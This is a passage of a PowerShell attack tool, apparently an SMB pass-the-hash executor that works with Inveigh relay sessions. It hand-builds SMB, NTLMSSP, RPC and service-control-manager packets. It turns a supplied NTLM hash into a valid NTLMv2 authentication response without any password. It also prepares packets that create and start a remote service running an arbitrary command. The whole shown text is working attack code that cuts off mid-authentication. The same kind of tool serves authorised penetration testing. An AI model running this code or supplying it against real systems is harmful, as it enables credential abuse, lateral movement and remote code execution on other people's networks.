    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLM_response.Length)
    $packet_NTLMSSP_length = $packet_NTLMSSP_length[1,0]
    [Byte[]]$packet_ASN_length_1 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 12)
    $packet_ASN_length_1 = $packet_ASN_length_1[1,0]
    [Byte[]]$packet_ASN_length_2 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 8)
    $packet_ASN_length_2 = $packet_ASN_length_2[1,0]
    [Byte[]]$packet_ASN_length_3 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 4)
    $packet_ASN_length_3 = $packet_ASN_length_3[1,0]

    $packet_NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
    $packet_NTLMSSPAuth.Add("ASNLength",$packet_ASN_length_1)
    $packet_NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
    $packet_NTLMSSPAuth.Add("ASNLength2",$packet_ASN_length_2)
    $packet_NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
    $packet_NTLMSSPAuth.Add("ASNLength3",$packet_ASN_length_3)
    $packet_NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
    $packet_NTLMSSPAuth.Add("NTLMSSPLength",$packet_NTLMSSP_length)
    $packet_NTLMSSPAuth.Add("NTLMResponse",$packet_NTLM_response)

    return $packet_NTLMSSPAuth
}

#RPC

function New-PacketRPCBind
{
    param([Int]$packet_call_ID,[Byte[]]$packet_max_frag,[Byte[]]$packet_num_ctx_items,[Byte[]]$packet_context_ID,[Byte[]]$packet_UUID,[Byte[]]$packet_UUID_version)

    [Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)

    $packet_RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCBind.Add("Version",[Byte[]](0x05))
    $packet_RPCBind.Add("VersionMinor",[Byte[]](0x00))
    $packet_RPCBind.Add("PacketType",[Byte[]](0x0b))
    $packet_RPCBind.Add("PacketFlags",[Byte[]](0x03))
    $packet_RPCBind.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCBind.Add("FragLength",[Byte[]](0x48,0x00))
    $packet_RPCBind.Add("AuthLength",[Byte[]](0x00,0x00))
    $packet_RPCBind.Add("CallID",$packet_call_ID_bytes)
    $packet_RPCBind.Add("MaxXmitFrag",[Byte[]](0xb8,0x10))
    $packet_RPCBind.Add("MaxRecvFrag",[Byte[]](0xb8,0x10))
    $packet_RPCBind.Add("AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_RPCBind.Add("NumCtxItems",$packet_num_ctx_items)
    $packet_RPCBind.Add("Unknown",[Byte[]](0x00,0x00,0x00))
    $packet_RPCBind.Add("ContextID",$packet_context_ID)
    $packet_RPCBind.Add("NumTransItems",[Byte[]](0x01))
    $packet_RPCBind.Add("Unknown2",[Byte[]](0x00))
    $packet_RPCBind.Add("Interface",$packet_UUID)
    $packet_RPCBind.Add("InterfaceVer",$packet_UUID_version)
    $packet_RPCBind.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))
    $packet_RPCBind.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $packet_RPCBind.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    if($packet_num_ctx_items[0] -eq 2)
    {
        $packet_RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $packet_RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $packet_RPCBind.Add("Unknown3",[Byte[]](0x00))
        $packet_RPCBind.Add("Interface2",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
        $packet_RPCBind.Add("InterfaceVer2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif($packet_num_ctx_items[0] -eq 3)
    {
        $packet_RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $packet_RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $packet_RPCBind.Add("Unknown3",[Byte[]](0x00))
        $packet_RPCBind.Add("Interface2",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        $packet_RPCBind.Add("InterfaceVer2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        $packet_RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("ContextID3",[Byte[]](0x02,0x00))
        $packet_RPCBind.Add("NumTransItems3",[Byte[]](0x01))
        $packet_RPCBind.Add("Unknown4",[Byte[]](0x00))
        $packet_RPCBind.Add("Interface3",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        $packet_RPCBind.Add("InterfaceVer3",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("InterfaceVerMinor3",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("AuthType",[Byte[]](0x0a))
        $packet_RPCBind.Add("AuthLevel",[Byte[]](0x04))
        $packet_RPCBind.Add("AuthPadLength",[Byte[]](0x00))
        $packet_RPCBind.Add("AuthReserved",[Byte[]](0x00))
        $packet_RPCBind.Add("ContextID4",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $packet_RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    if($packet_call_ID -eq 3)
    {
        $packet_RPCBind.Add("AuthType",[Byte[]](0x0a))
        $packet_RPCBind.Add("AuthLevel",[Byte[]](0x02))
        $packet_RPCBind.Add("AuthPadLength",[Byte[]](0x00))
        $packet_RPCBind.Add("AuthReserved",[Byte[]](0x00))
        $packet_RPCBind.Add("ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $packet_RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    return $packet_RPCBind
}

function New-PacketRPCRequest
{
    param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)

    if($packet_auth_length -gt 0)
    {
        $packet_full_auth_length = $packet_auth_length + $packet_auth_padding + 8
    }

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)
    [Byte[]]$packet_frag_length = $packet_write_length[0,1]
    [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)
    [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)
    $packet_auth_length = $packet_auth_length[0,1]

    $packet_RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCRequest.Add("Version",[Byte[]](0x05))
    $packet_RPCRequest.Add("VersionMinor",[Byte[]](0x00))
    $packet_RPCRequest.Add("PacketType",[Byte[]](0x00))
    $packet_RPCRequest.Add("PacketFlags",$packet_flags)
    $packet_RPCRequest.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCRequest.Add("FragLength",$packet_frag_length)
    $packet_RPCRequest.Add("AuthLength",$packet_auth_length)
    $packet_RPCRequest.Add("CallID",$packet_call_ID)
    $packet_RPCRequest.Add("AllocHint",$packet_alloc_hint)
    $packet_RPCRequest.Add("ContextID",$packet_context_ID)
    $packet_RPCRequest.Add("Opnum",$packet_opnum)

    if($packet_data.Length)
    {
        $packet_RPCRequest.Add("Data",$packet_data)
    }

    return $packet_RPCRequest
}

#SCM

function New-PacketSCMOpenSCManagerW
{
    param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service.Length + 92)
    [Byte[]]$packet_frag_length = $packet_write_length[0,1]
    [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service.Length + 68)
    $packet_referent_ID1 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $packet_referent_ID1 = $packet_referent_ID1.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $packet_referent_ID1 += 0x00,0x00
    $packet_referent_ID2 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $packet_referent_ID2 = $packet_referent_ID2.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $packet_referent_ID2 += 0x00,0x00

    $packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCMOpenSCManagerW.Add("MachineName_ReferentID",$packet_referent_ID1)
    $packet_SCMOpenSCManagerW.Add("MachineName_MaxCount",$packet_service_length)
    $packet_SCMOpenSCManagerW.Add("MachineName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("MachineName_ActualCount",$packet_service_length)
    $packet_SCMOpenSCManagerW.Add("MachineName",$packet_service)
    $packet_SCMOpenSCManagerW.Add("Database_ReferentID",$packet_referent_ID2)
    $packet_SCMOpenSCManagerW.Add("Database_NameMaxCount",[Byte[]](0x0f,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Database_NameOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Database_NameActualCount",[Byte[]](0x0f,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Database",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Unknown",[Byte[]](0xbf,0xbf))
    $packet_SCMOpenSCManagerW.Add("AccessMask",[Byte[]](0x3f,0x00,0x00,0x00))
    
    return $packet_SCMOpenSCManagerW
}

function New-PacketSCMCreateServiceW
{
    param([Byte[]]$packet_context_handle,[Byte[]]$packet_service,[Byte[]]$packet_service_length,
            [Byte[]]$packet_command,[Byte[]]$packet_command_length)
                
    $packet_referent_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $packet_referent_ID = $packet_referent_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $packet_referent_ID += 0x00,0x00

    $packet_SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCMCreateServiceW.Add("ContextHandle",$packet_context_handle)
    $packet_SCMCreateServiceW.Add("ServiceName_MaxCount",$packet_service_length)
    $packet_SCMCreateServiceW.Add("ServiceName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add("ServiceName_ActualCount",$packet_service_length)
    $packet_SCMCreateServiceW.Add("ServiceName",$packet_service)
    $packet_SCMCreateServiceW.Add("DisplayName_ReferentID",$packet_referent_ID)
    $packet_SCMCreateServiceW.Add("DisplayName_MaxCount",$packet_service_length)
    $packet_SCMCreateServiceW.Add("DisplayName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add("DisplayName_ActualCount",$packet_service_length)
    $packet_SCMCreateServiceW.Add("DisplayName",$packet_service)
    $packet_SCMCreateServiceW.Add("AccessMask",[Byte[]](0xff,0x01,0x0f,0x00))
    $packet_SCMCreateServiceW.Add("ServiceType",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add("ServiceStartType",[Byte[]](0x03,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add("ServiceErrorControl",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add("BinaryPathName_MaxCount",$packet_command_length)
    $packet_SCMCreateServiceW.Add("BinaryPathName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add("BinaryPathName_ActualCount",$packet_command_length)
    $packet_SCMCreateServiceW.Add("BinaryPathName",$packet_command)
    $packet_SCMCreateServiceW.Add("NULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add("TagID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add("NULLPointer2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add("DependSize",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add("NULLPointer3",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add("NULLPointer4",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add("PasswordSize",[Byte[]](0x00,0x00,0x00,0x00))

    return $packet_SCMCreateServiceW
}

function New-PacketSCMStartServiceW
{
    param([Byte[]]$packet_context_handle)

    $packet_SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCMStartServiceW.Add("ContextHandle",$packet_context_handle)
    $packet_SCMStartServiceW.Add("Unknown",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $packet_SCMStartServiceW
}

function New-PacketSCMDeleteServiceW
{
    param([Byte[]]$packet_context_handle)

    $packet_SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCMDeleteServiceW.Add("ContextHandle",$packet_context_handle)

    return $packet_SCMDeleteServiceW
}

function New-PacketSCMCloseServiceHandle
{
    param([Byte[]]$packet_context_handle)

    $packet_SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCM_CloseServiceW.Add("ContextHandle",$packet_context_handle)

    return $packet_SCM_CloseServiceW
}

function DataLength2
{
    param ([Int]$length_start,[Byte[]]$string_extract_data)

    $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)

    return $string_length
}

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

[String]$session_string = $session

if($session_string)
{

    if(!$Inveigh -or !$inveigh.session_socket_table[$session])
    {
        Write-Output "[-] Inveigh Relay session not found"
        $startup_error = $true
    }
    elseif(!$inveigh.session_socket_table[$session].Connected)
    {
        Write-Output "[-] Inveigh Relay session not connected"
        $startup_error = $true
    }

    $Target = $inveigh.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
$process_ID = $process_ID -replace "-00-00",""
[Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

if(!$session_string)
{
    $SMB_client = New-Object System.Net.Sockets.TCPClient
    $SMB_client.Client.ReceiveTimeout = 60000
}

if(!$startup_error -and !$session_string)
{

    try
    {
        $SMB_client.Connect($Target,"445")
    }
    catch
    {
        Write-Output "$Target did not respond"
    }

}

if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$session].Connected))
{
    $SMB_client_receive = New-Object System.Byte[] 1024

    if(!$session_string)
    {
        $SMB_client_stream = $SMB_client.GetStream()
        $SMB_client_stage = 'NegotiateSMB'

        while($SMB_client_stage -ne 'exit')
        {
            
            switch ($SMB_client_stage)
            {

                'NegotiateSMB'
                {          
                    $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID_bytes 0x00,0x00       
                    $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()    
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42')
                    {
                        $SMB_version = 'SMB1'
                        $SMB_client_stage = 'NTLMSSPNegotiate'

                        if([System.BitConverter]::ToString($SMB_client_receive[39]) -eq '0f')
                        {

                            if($SigningCheck)
                            {
                                Write-Output "SMB signing is required"
                                $SMB_client_stage = 'exit'
                            }
                            else
                            {    
                                Write-Verbose "SMB signing is required"
                                $SMB_signing = $true
                                $SMB_session_key_length = 0x00,0x00
                                $SMB_negotiate_flags = 0x15,0x82,0x08,0xa0
                            }

                        }
                        else
                        {

                            if($SigningCheck)
                            {
                                Write-Output "SMB signing is not required"
                                $SMB_client_stage = 'exit'
                            }
                            else
                            {    
                                $SMB_signing = $false
                                $SMB_session_key_length = 0x00,0x00
                                $SMB_negotiate_flags = 0x05,0x82,0x08,0xa0
                            }

                        }

                    }
                    else
                    {
                        $SMB_client_stage = 'NegotiateSMB2'

                        if([System.BitConverter]::ToString($SMB_client_receive[70]) -eq '03')
                        {

                            if($SigningCheck)
                            {
                                Write-Output "SMB signing is required"
                                $SMB_client_stage = 'exit'
                            }
                            else
                            {    
                                Write-Verbose "SMB signing is required"
                                $SMB_signing = $true
                                $SMB_session_key_length = 0x00,0x00
                                $SMB_negotiate_flags = 0x15,0x82,0x08,0xa0
                            }

                        }
                        else
                        {

                            if($SigningCheck)
                            {
                                Write-Output "SMB signing is not required"
                                $SMB_client_stage = 'exit'
                            }
                            else
                            {    
                                $SMB_signing = $false
                                $SMB_session_key_length = 0x00,0x00
                                $SMB_negotiate_flags = 0x05,0x80,0x08,0xa0
                            }

                        }

                    }

                }

                'NegotiateSMB2'
                {
                    $SMB2_tree_ID = 0x00,0x00,0x00,0x00
                    $SMB_session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                    $SMB2_message_ID = 1
                    $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID  
                    $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()    
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    $SMB_client_stage = 'NTLMSSPNegotiate'
                }
                    
                'NTLMSSPNegotiate'
                { 
                    
                    if($SMB_version -eq 'SMB1')
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID_bytes 0x00,0x00

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                        }

                        $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $SMB_negotiate_flags
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                        $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                    }
                    else
                    {
                        $SMB2_message_ID += 1
                        $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $SMB_negotiate_flags
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                        $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                    }

                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()    
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    $SMB_client_stage = 'exit'
                }
                
            }

        }

        if(!$SigningCheck)
        {
            $SMB_NTLMSSP = [System.BitConverter]::ToString($SMB_client_receive)
            $SMB_NTLMSSP = $SMB_NTLMSSP -replace "-",""
            $SMB_NTLMSSP_index = $SMB_NTLMSSP.IndexOf("4E544C4D53535000")
            $SMB_NTLMSSP_bytes_index = $SMB_NTLMSSP_index / 2
            $SMB_domain_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 12) $SMB_client_receive
            $SMB_target_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 40) $SMB_client_receive
            $SMB_session_ID = $SMB_client_receive[44..51]
            $SMB_NTLM_challenge = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 24)..($SMB_NTLMSSP_bytes_index + 31)]
            $SMB_target_details = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
            $SMB_target_time_bytes = $SMB_target_details[($SMB_target_details.Length - 12)..($SMB_target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (Get-ChildItem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
            $auth_domain_length = $auth_domain_length[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
            $auth_domain_length = $auth_domain_length[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)
            $auth_username_length = $auth_username_length[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)
            $auth_hostname_length = $auth_hostname_length[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $SMB_target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $SMB_target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $SMB_NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

            if($SMB_signing)
            {
                $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
                $session_key = $session_base_key
                $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
                $HMAC_SHA256.key = $session_key
            }

            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)
            $NTLMv2_response_length = $NTLMv2_response_length[0,1]
            $SMB_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $SMB_session_key_length +
                                    $SMB_session_key_length +
                                    $SMB_session_key_offset +
                                    $SMB_negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            if($SMB_version -eq 'SMB1')
            {
                $SMB_user_ID = $SMB_client_receive[32,33]
                $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID_bytes $SMB_user_ID

                if($SMB_signing)
                {
                    $packet_SMB_header["Flags2"] = 0x05,0x48
                }

                $packet_SMB_header["UserID"] = $SMB_user_ID
                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
